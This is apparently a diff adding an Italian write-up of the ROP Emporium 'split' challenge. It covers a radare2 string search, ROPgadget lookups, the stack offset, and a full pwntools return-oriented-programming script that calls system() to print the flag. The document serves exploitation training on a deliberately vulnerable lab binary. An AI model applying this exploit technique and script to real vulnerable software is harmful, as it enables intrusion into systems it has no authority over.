@@ -1,0 +1,41 @@
+1)split
+  La classica iniezione tipo shellcode non ci è utile a causa di W^X.
+  Iniziando:
+    1)Il testo ci dice che nel .bin c'è una stringa salvata che ci serve. Quindi ispezioniamo la parte .data con r2 (radare 2)
+    	r2 split
+    	iz
+    	=>0x00601060 17  18   .data   ascii /bin/cat flag.txt
+    	
+    2)Il nostro obiettivo è di fare una chiamata system che mi apra una shell ed eseguire quel comando. system() ha un parametro. Quindi ci serve un gadget per caricare il valore di cui necessitiamo in rdi
+    
+    	ROPgadget --binary "./split" | grep "rdi"
+    		=>0x00000000004007c3 : pop rdi ; ret
+    
+    3)Manca solamente l'indirizzo della chiamata (gdb)
+    	p system
+    	=>$1 = {<text variable, no debug info>} 0x400560 <system@plt>
+    	
+    4)Gadget eventuale allineamento stack
+    	ROPgadget --binary "./split" | grep "ret"
+    	=>0x000000000040053e : ret 
+  Ora:
+  buffer overflow:
+  	buffer[32];
+  	RBP => 8 B
+  	RSP (payload trascurabile)
+  	RIP
+  Si inizia ad overlodare il RIP dopo 40 Bytes di garbage
+  
+  from pwn import *
+  p=process('./split') 
+  garbage=b'A'*40
+  gadget_rdi=p64(0x00000000004007c3) #pop rdi;ret
+  ind_flag= p64(0x00601060)
+  allineamento=p64(0x000000000040053e)#ret
+  syscall=p64(0x400560) 
+  payload=garbage
+  payload+= gadget_rdi + ind_flag + allineamento + syscall
+  p.sendline(payload)
+  p.interactive()
+  
+  =>ROPE{a_placeholder_32byte_flag!}
